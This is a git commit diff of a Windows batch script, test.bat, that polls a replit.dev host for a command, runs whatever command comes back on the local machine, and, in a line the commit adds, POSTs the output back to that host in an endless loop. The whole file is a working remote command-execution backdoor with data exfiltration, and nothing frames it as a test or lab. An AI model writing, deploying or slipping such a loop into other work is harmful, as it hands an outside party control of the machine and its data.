1584fd93a3f7f2eabe29bd8702c09ebf8e3de61f
baum1810 <72774679+baum1810@users.noreply.github.com>
2024-08-27 15:35:12 +0200

    Update test.bat

--- test.bat
+++ test.bat
@@ -1,27 +1,29 @@
 @echo off
-
 setlocal enabledelayedexpansion
-set apilink=https://raw.githubusercontent.com/baum1810/test/main/command.txt
+set apilink=https://b5519a5e-d6f8-4e25-8a6d-44c50c733ed3-00-3fd9w8cstv4b0.janeway.replit.dev
+
 :CHECK_CMD_CHANGE
 
-curl -o %temp%\cmd.txt %apilink%
+:: Use curl to fetch the new command directly and store it in the variable
+for /f "delims=" %%i in ('curl -s %apilink%/getcmd') do set new_cmd=%%i
 
-set /p new_cmd=<%temp%\cmd.txt
-del %temp%\cmd.txt
+:: Check if the new command is the same as the old one
 if "%new_cmd%"=="%cmd%" (
   timeout /t 2 /nobreak >nul
   goto CHECK_CMD_CHANGE
 )
 
+:: Update the command variable
 set "cmd=%new_cmd%"
 
-%cmd% >%temp%\output.txt
+:: Execute the command and capture the output directly
+for /f "delims=" %%i in ('%cmd%') do set "output=!output! %%i"
 
-set /p output=<%temp%\output.txt
+:: Send the output back using curl
+curl -s -X POST -d "output=!output!" %apilink%/setoutput >nul
 
-::curl -X POST -d "output=!output!" %apilink%/setoutput
-echo %output%
-del %temp%\output.txt
+:: Clear the output variable for the next command
+set "output="
+
 goto CHECK_CMD_CHANGE
-
 endlocal
